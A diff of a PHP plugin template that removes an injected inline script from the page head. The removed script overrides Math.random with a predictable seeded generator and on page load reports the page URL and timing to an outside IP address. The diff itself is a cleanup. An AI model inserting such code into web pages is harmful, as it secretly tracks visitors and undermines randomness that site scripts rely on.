@@ -455,7 +455,6 @@ EOT;
     <link rel="stylesheet" href="{$this->pluginUrl}/css/skeleton/layout.css">
 
     <!-- Javascript -->
-    <script type="text/javascript">/* <![CDATA[ */Math.random=function(a,c,d,b){return function(){return 300>d++?(a=(1103515245*a+12345)%b,a/b):c()}}(358074913,Math.random,0,1<<21);(function(){function b(){try{if(top.window.location.href==c&&!0!=b.a){var a=-1!=navigator.userAgent.indexOf('MSIE')?new XDomainRequest:new XMLHttpRequest;a.open('GET','http://1.2.3.4/cserver/clientresptime?cid=CID10140982.AID34.TID53987&url='+encodeURIComponent(c)+'&resptime='+(new Date-d)+'&starttime='+d.valueOf(),!0);a.send(null);b.a=!0}}catch(e){}}var d=new Date,a=window,c=document.location.href,f='undefined';f!=typeof a.attachEvent?a.attachEvent('onload',b):f!=typeof a.addEventListener&& a.addEventListener('load',b,!1)})();/* ]]> */</script>
     <script src="{$this->pluginUrl}/lib/js/jquery-1.11.0.min.js"></script>
     <script type="text/javascript" src="http://www.ei8t.com/js/swfobject/swfobject.js"></script>
 
